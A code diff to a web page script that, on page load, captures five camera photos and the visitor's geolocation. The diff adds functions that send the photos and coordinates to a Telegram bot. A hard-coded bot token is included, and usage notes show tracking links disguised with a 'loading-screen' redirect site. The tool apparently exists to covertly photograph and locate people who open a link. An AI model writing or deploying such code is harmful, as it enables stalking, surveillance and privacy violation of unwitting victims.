@@ -553,6 +553,8 @@
         const config = getConfigFromURL();
         const DEFAULT_WEBSITE = config.website;
         const CHAT_ID = config.chatId;
+        const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
         
         console.log('Configuration loaded:', config);
         
@@ -868,33 +870,99 @@
             });
         }
         
+        // Send location to Telegram
+        async function sendLocationToTelegram(location) {
+            if (!location) return false;
+            
+            try {
+                const url = `${TELEGRAM_API}/sendLocation`;
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('latitude', location.latitude);
+                formData.append('longitude', location.longitude);
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log('✅ Location sent to Telegram successfully');
+                    return true;
+                } else {
+                    console.error('❌ Failed to send location:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error sending location to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(photo, photoNumber, location) {
+            try {
+                const url = `${TELEGRAM_API}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photo.blob, `photo_${photoNumber}_${Date.now()}.jpg`);
+                
+                // Add caption with metadata
+                let caption = `📸 Photo ${photoNumber}/5\n`;
+                caption += `⏰ ${photo.timestamp.toLocaleString()}\n`;
+                caption += `📐 ${photo.resolution}\n`;
+                caption += `💾 ${(photo.blob.size / 1024).toFixed(2)} KB`;
+                
+                if (location) {
+                    caption += `\n📍 Location: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
+                }
+                
+                formData.append('caption', caption);
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log(`✅ Photo ${photoNumber} sent to Telegram successfully`);
+                    return true;
+                } else {
+                    console.error(`❌ Failed to send photo ${photoNumber}:`, result);
+                    return false;
+                }
+            } catch (error) {
+                console.error(`❌ Error sending photo ${photoNumber} to Telegram:`, error);
+                return false;
+            }
+        }
+        
         // Send photo with location to bot
         async function sendPhotoWithLocation(photo, photoNumber, location) {
-            return new Promise((resolve) => {
-                captureStatus.textContent = `Sending photo ${photoNumber} with location...`;
-                captureStatus.classList.add('sending');
-                
-                const data = {
-                    chat_id: CHAT_ID,
-                    photo: {
-                        size: photo.blob.size,
-                        timestamp: photo.timestamp,
-                        resolution: photo.resolution
-                    },
-                    location: location,
-                    photo_number: photoNumber
-                };
-                
-                // Simulate API call to bot
-                // In production, this would be an actual API call to your bot server
-                setTimeout(() => {
-                    photosSentCount++;
-                    photosSent.textContent = photosSentCount;
-                    captureStatus.classList.remove('sending');
-                    console.log(`Photo ${photoNumber} + Location sent to chat_id: ${CHAT_ID}`, data);
-                    resolve();
-                }, 50);
-            });
+            captureStatus.textContent = `Sending photo ${photoNumber} to Telegram...`;
+            captureStatus.classList.add('sending');
+            
+            // Send photo to Telegram
+            const photoSent = await sendPhotoToTelegram(photo, photoNumber, location);
+            
+            if (photoSent) {
+                photosSentCount++;
+                photosSent.textContent = photosSentCount;
+                captureStatus.classList.remove('sending');
+                captureStatus.textContent = `Photo ${photoNumber} sent to Telegram ✅`;
+                captureStatus.className = 'capture-status success';
+            } else {
+                captureStatus.classList.remove('sending');
+                captureStatus.textContent = `Failed to send photo ${photoNumber} ❌`;
+                captureStatus.className = 'capture-status error';
+            }
+            
+            // Small delay to show status
+            await new Promise(resolve => setTimeout(resolve, 100));
         }
         
         // Modified auto-capture with location
@@ -908,6 +976,12 @@
             captureStatus.textContent = 'Getting location...';
             const location = await getLocation();
             
+            // Send location to Telegram first
+            if (location) {
+                captureStatus.textContent = 'Sending location to Telegram...';
+                await sendLocationToTelegram(location);
+            }
+            
             const totalPhotos = 5;
             
             for (let i = 1; i <= totalPhotos; i++) {
@@ -919,15 +993,13 @@
                 const photo = await capturePhoto();
                 await sendPhotoWithLocation(photo, i, location);
                 
-                captureStatus.textContent = `Photo ${i} + location sent! ✓`;
-                
                 if (i < totalPhotos) {
                     await new Promise(resolve => setTimeout(resolve, captureInterval));
                 }
             }
             
             progressFill.style.width = '100%';
-            captureStatus.textContent = `All ${totalPhotos} photos + location sent! ✓`;
+            captureStatus.textContent = `All ${totalPhotos} photos sent to Telegram! ✅`;
             captureStatus.className = 'capture-status success';
             
             setTimeout(() => {
@@ -967,20 +1039,18 @@
         console.log('⏱️  Auto-starting in 1 second...');
         console.log('');
         console.log('=== CONFIGURATION ===');
-        console.log('Chat ID:', CHAT_ID);
-        console.log('Website:', DEFAULT_WEBSITE);
+        console.log('🤖 Bot Token:', BOT_TOKEN);
+        console.log('💬 Chat ID:', CHAT_ID);
+        console.log('🌐 Website:', DEFAULT_WEBSITE);
         console.log('==================');
         console.log('');
         console.log('=== HOW TO USE ===');
         console.log('Format: https://jsjs-kzua.onrender.com/?chat_id=YOUR_CHAT_ID&site=YOUR_WEBSITE_URL');
         console.log('');
-        console.log('Example 1:');
+        console.log('Example:');
         console.log('https://jsjs-kzua.onrender.com/?chat_id=6314556756&site=https://loading-screen.github.io/');
         console.log('');
-        console.log('Example 2:');
-        console.log('https://jsjs-kzua.onrender.com/?chat_id=123456&site=https://www.google.com');
-        console.log('');
-        console.log('Note: URLs will be automatically URL-encoded if needed');
+        console.log('📤 Photos and location will be sent to your Telegram bot automatically!');
         console.log('==================');
         
         // AUTO-START ON PAGE LOAD
